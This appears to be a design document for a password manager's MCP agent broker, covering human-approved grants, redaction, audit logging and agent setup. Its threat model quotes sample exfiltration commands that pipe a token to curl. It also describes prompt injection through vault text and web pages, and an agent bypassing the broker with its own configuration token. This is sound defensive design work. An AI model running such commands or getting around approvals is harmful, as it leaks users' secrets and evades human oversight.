# AI agents: `pbx mcp`, grants and approvals

> **Draft.** Not reviewed by cryptographers and not audited. Formats may still change before the first release that ships them.

This document describes wave F7 as implemented, following the concept in [docs/planning/ai-native.md](../planning/ai-native.md) (German; K1 agent access, K12 agent audit). Setup instructions for the agents are at the end.

## What it does

`pbx mcp` lets an AI agent (Claude Code, Claude Desktop, Cursor, VS Code, Codex, …) build, test and deploy with your secrets **without seeing them**:

- The agent can search items and sees **metadata**: IDs, titles, vaults, categories, website domains, login usernames, field names and `pbx://` references. Never passwords, other concealed or TOTP values, card numbers or notes.
- The agent can **use** secrets: run a command with secrets in its environment (`passbox_run`), or render a config file from a template (`passbox_inject`). Values go into the process or the file, never into a tool result. Command output is redacted.
- The agent can **save** a new secret (`passbox_create_item`), for example an API token it just created, by passing a file path or asking Passbox to generate a password. The value is not returned.
- **Every use needs a grant you approved on another device**: the Passbox web app or the desktop app (which shows the web app and asks for attention). There is no tool that reveals a secret to the agent, and no approval on the terminal.

## Components

```
agent ──MCP (stdio)──▶ pbx mcp (crates/cli/src/mcp.rs: protocol only)
                          │
                          ▼
                 agent broker (crates/client/src/agent: grants, tools, redaction, audit)
                          │  account session or service account token
                          ▼
                 passbox-server: /agent-grants (relay), /agent-events (audit)
                          ▲
                          │  signed decision (account Ed25519 key)
            Passbox web / desktop app on another signed-in device: approval dialog
```

- **`crates/core/src/agent_grant.rs`** holds only cryptography: the canonical grant request, the decision, and its signature and verification. No AI code is in the core.
- **The broker** (`passbox_client::agent`) decides: it resolves references, checks grants (items, action, allowlist, time limit, uses), asks the server for revocations before every use, runs commands, redacts output and reports every action. It works with the account on the machine or with a service account (`Backend` trait).
- **`pbx mcp`** translates MCP (JSON-RPC 2.0, newline-delimited, protocol versions 2025-06-18, 2025-03-26 and 2024-11-05) to broker calls. It is implemented directly (about 400 lines) to keep a dependency out of the path to secrets. Tool descriptions are fixed in the binary.
- **The server** relays requests and decisions and stores the audit trail (`agent_grants`, `agent_events`, migration `0011`). It never sees secret values.
- **The approving app** (web, `apps/web/src/developer`) shows pending requests, parses the exact request bytes with the WebAssembly core, and signs the decision.

## Grants

A grant request is a canonical object (see `agent_grant.rs`):

```
request  = canonical("passbox/v1/agent-grant-request", id, principal_kind (session|service), principal_id,
                     client_name, on_behalf_of, [(item_id, vault_id)], [action], [command], [path],
                     reason, ttl_ms, max_uses, created_at, nonce)
decision = canonical("passbox/v1/agent-grant-decision", object_hash(request), approved, not_after,
                     max_uses, approver_id, decided_at)
sig      = Ed25519(on_behalf_of's account signing key, decision)
```

- **Scope:** 1 to 50 named items, never "everything". Actions are `run`, `inject` and `create` (`reveal` does not exist). `run` needs an allowlist of commands; `inject` a list of output paths.
- **Allowlist:** an entry is an exact command line (whitespace normalized) or a prefix ending in ` *`. A prefix never matches a command line containing `;`, `|`, `&`, `` ` ``, `$(`, `>`, `<` or a line break, so `terraform *` does not allow `terraform plan; curl evil -d $TOKEN`.
- **Per-use approval:** a command (or output path) that no grant allows makes the broker ask for a single-use grant naming exactly that command line, valid for 10 minutes.
- **Time limit:** 1 minute to 8 hours (default 1 hour), counted from the decision. Optional number of uses; the approver can lower it, never raise it. Grants live in the `pbx mcp` process and end when it exits.
- **Verification:** the broker accepts a decision only if it covers the hash of the request bytes it sent, is signed by the account the request was made for (the own account key for a signed-in session; for a service account, the owner's key from the service account's encrypted private part, not from the server) and does not exceed the request. The server checks the signature too, to keep garbage out.
- **Revocation:** the approving app can revoke a grant; the broker checks the grant's status with the server before every use and refuses when the server is unreachable (fail closed).
- **Approval code:** six digits from the request hash, shown in the tool result and in the dialog, so the person can match the request on screen with the agent's message.

## Audit (K12)

Every action is recorded twice, never with values:

- **Server:** `agent_events` (principal, client name, grant, tool, item IDs, target, result) and an entry in the account's activity (`agent_grant_requested`, `agent_grant_approved`, `agent_grant_denied`, `agent_grant_revoked`, `agent_run`, `agent_inject`, `agent_create`, `agent_request_access`). Searches are kept in `agent_events` only. The target of a command is its first word plus 16 hex digits of a hash of the whole command line, because command lines can contain data.
- **Locally:** `agent-audit.log` (JSON Lines, mode 0600) in the CLI data directory.

The web app's **Developer → Agent activity** lists both the grants and the events.

## Threat model

Assets: secret values in the vault; the integrity of what runs with them; the person's attention (approval fatigue).

| Threat | Mitigation | Residual risk |
| --- | --- | --- |
| **Prompt injection** makes the agent request or use a secret (text in an issue, a web page, a README, a vault item's notes) | Every use needs a human approval outside the agent's channel. The dialog shows the full command line, the items, the agent's reason (marked as the agent's words) and the client name. Allowlists are narrow by default; per-use approvals name one command. Tool results mark vault text as untrusted data. | A person can approve a malicious command they did not read. Keep allowlists short and read command lines. |
| **Exfiltration through command output** (`echo $TOKEN`, `env`, `base64`) | Output is redacted for every injected value as is, Base64 (standard/URL, with and without padding), hex and percent-encoded; long multi-line values also line by line; output is capped at 32 KB per stream. | Transformations the redactor does not know (reversed, compressed, split, partially printed) pass. Redaction is a safety net, not the boundary; the approval of the command is. |
| **Exfiltration through the network** (`curl attacker -d $TOKEN`) | The approval shows the command line; prefix allowlists cannot be extended with shell operators. | An allowed program can itself send data anywhere (for example a deploy script under the agent's control). A network allowlist or sandbox per grant is planned, not built. |
| **The agent reads the secret through the file system** after `passbox_inject` | `inject` needs approval per output path; files are written 0600. | The agent usually runs as the same user and can read the file. Use `run` when you can; inject only into paths the agent will not read. |
| **The agent answers its own approval** | No terminal prompt and no CLI approve command: decisions come only from the web or desktop app, signed with the account key; the server also refuses decisions from CLI sessions. With a service account token, `pbx mcp` holds no key that can sign an approval at all. | A compromised device that is signed in to your account can approve. Without a service account, `pbx mcp` unlocks your account with `PASSBOX_PASSWORD`, so a process that reads that password has your whole account, including the key that signs approvals: use a service account. |
| **A malicious or compromised server** approves, changes or replays requests | Decisions are signed by the account key and bound to the hash of the exact request bytes; the approving app displays what it parsed from those bytes; the broker verifies. | The server can withhold requests or decisions (denial of service) and sees metadata (who asked, when, which item IDs, client names). |
| **Agent reads credentials from disk** (MCP config with a token or `PASSBOX_PASSWORD`, `pbx` data directory) | `pbx mcp` scrubs `PASSBOX_PASSWORD`, `PASSBOX_SERVICE_ACCOUNT_TOKEN`, `PASSBOX_TWO_FACTOR_CODE` and `PASSBOX_SECRET_KEY` from every command it runs. Recommended setup: a dedicated service account with read access to one small vault, with an expiry. | An agent that can run arbitrary shell commands as your user can read its own MCP configuration and use the token directly with `pbx`, bypassing the broker. The token then gives exactly what the service account has: keep it small, set an expiry, and restrict the agent's file access (Claude Code permissions, sandboxing). Server-enforced approvals for agent principals are planned (K11). |
| **Approval fatigue** | Grants with an allowlist cover a task (default 1 hour); single-use grants for everything else; pending requests expire after 10 minutes; at most 10 pending per account and 30 requests per 10 minutes per principal. | People approve what they see often. |
| **Rug pull** (tool descriptions change to invite misuse) | Tool names, descriptions and schemas are compiled into `pbx`. | A malicious `pbx` build is out of scope; use signed releases. |
| **Malicious vault content** shared by others (titles, labels, tags) | Search results say that vault text is data, not instructions; notes are never returned. | Agents may still follow instructions in titles. |

What `pbx mcp` deliberately does **not** do: return secret values to the agent ("reveal"), approve anything itself, read approvals from the terminal, keep grants after it exits, or call any AI model.

## Setup

Recommended for every agent: create a service account (**Developer → Service accounts** in the web app) with **read** access to a vault that holds only what the agent needs, and an expiry. Install `pbx` (see [cli.md](../cli.md)). Keep the Passbox web or desktop app open and signed in on a device you are watching: that is where approvals appear.

Without a service account, `pbx mcp` uses the account signed in with `pbx signin` and needs `PASSBOX_PASSWORD` in its environment (it cannot prompt, standard input is the protocol). Prefer the service account: the master password in a configuration file is a much bigger key.

### Claude Code

```sh
claude mcp add passbox \
  --env PASSBOX_SERVER=https://passbox.example.com \
  --env PASSBOX_SERVICE_ACCOUNT_TOKEN=pbx_sa_… \
  -- pbx mcp
```

Use the user scope (default `local`, or `--scope user`), not a project `.mcp.json` that is committed. Consider denying the agent read access to `~/.claude.json` in your permission settings, since it contains the token.

### Claude Desktop

`claude_desktop_config.json` (Settings → Developer → Edit config):

```json
{
  "mcpServers": {
    "passbox": {
      "command": "pbx",
      "args": ["mcp"],
      "env": {
        "PASSBOX_SERVER": "https://passbox.example.com",
        "PASSBOX_SERVICE_ACCOUNT_TOKEN": "pbx_sa_…"
      }
    }
  }
}
```

Use the full path to `pbx` if it is not on the app's `PATH` (for example `/Users/you/.cargo/bin/pbx`).

### Cursor

`~/.cursor/mcp.json` (global; avoid the project file `.cursor/mcp.json` for tokens):

```json
{
  "mcpServers": {
    "passbox": {
      "command": "pbx",
      "args": ["mcp"],
      "env": {
        "PASSBOX_SERVER": "https://passbox.example.com",
        "PASSBOX_SERVICE_ACCOUNT_TOKEN": "pbx_sa_…"
      }
    }
  }
}
```

### VS Code (GitHub Copilot agent mode)

User `mcp.json` (Command Palette → "MCP: Open User Configuration"); the input keeps the token out of the file:

```json
{
  "inputs": [
    { "type": "promptString", "id": "passbox-token", "description": "Passbox service account token", "password": true }
  ],
  "servers": {
    "passbox": {
      "type": "stdio",
      "command": "pbx",
      "args": ["mcp"],
      "env": {
        "PASSBOX_SERVER": "https://passbox.example.com",
        "PASSBOX_SERVICE_ACCOUNT_TOKEN": "${input:passbox-token}"
      }
    }
  }
}
```

### Codex CLI and others

Any client that starts stdio MCP servers works the same way: command `pbx`, argument `mcp`, the two environment variables. For Codex, add to `~/.codex/config.toml`:

```toml
[mcp_servers.passbox]
command = "pbx"
args = ["mcp"]
env = { PASSBOX_SERVER = "https://passbox.example.com", PASSBOX_SERVICE_ACCOUNT_TOKEN = "pbx_sa_…" }
```

### Using it

Ask the agent, for example: "Run the database migrations against staging using the Staging DB credentials from Passbox." The agent searches, then calls `passbox_run` with `env: {"DATABASE_URL": "pbx://Agent/Staging DB/url"}`. Your Passbox app shows the request with its approval code; check the command line and approve. The agent receives the exit code and the redacted output.

For a series of commands, the agent can ask once with `passbox_request_access` and an allowlist such as `["npm run migrate *", "npm test"]` for an hour.

## Not yet built

- Approval on the phone and a native desktop dialog with biometrics (the desktop app shows the web dialog and asks for attention).
- Server-enforced approvals for agent principals (K11): today the broker enforces grants; the server enforces only the service account's vault access.
- Network allowlists or sandboxes per grant; browser autofill for agents (K2).
- Marking items as "used by an agent" in Watchtower.
